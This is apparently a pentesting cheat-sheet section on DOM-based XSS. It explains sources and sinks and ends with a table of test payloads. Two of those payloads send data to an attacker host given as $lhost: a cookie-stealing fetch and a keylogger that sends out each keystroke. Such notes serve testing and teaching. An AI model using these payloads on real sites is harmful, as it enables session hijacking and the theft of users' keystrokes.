
## DOM-Based
### What is it
DOM-based XSS vulnerabilities usually arise when JavaScript takes data from an attacker-controllable source, such as the URL, and passes it to a sink that supports dynamic ccode execution, such as `eval()` or innerHTML. This enables attackers to execute malicious JavaScript, which typically allows them to hijack other users' accounts. 

To deliver a DOM-based XSS attack, you need to place data into a source so that it is propagated to a sink and causes execution of arbitrary JavaScript. In a DOM-based XSS attack, a malicious payload is not actually parsed by the victim's browser until the website's legitimate JavaScript is executed. 

The most common source for DOM XSS is the URL, which is typically accessed with the window.location object. An atttacker can construct a link to send a victim to a vulnerable page with a payload in the query string and fragment portions of the URL. In certain circumstances, such as when targeting a 404 page or a website running PHP, the payload can also be places in the path. 

### How to test


| Info | Payload |
|:-----|:--------|
| Show text alert | `<script>alert('XSS');</script>` | 
| Show alert with cookies | `test" onmouseover="alert(document.cookie)"` |
| Change background of website to red | `test" onmouseover="document.body.style.backgroundColor = 'red';` |
| Steal session to attackers webserver | `<script>fetch('https://$lhost/steal?cookie=' + btoa(document.cookie));</script>` | 
| Keylogger to attackers webserver | `<script>document.onkeypress = function(e) { fetch('https://$lhost/log?key=' + btoa(e.key) );}</script>` |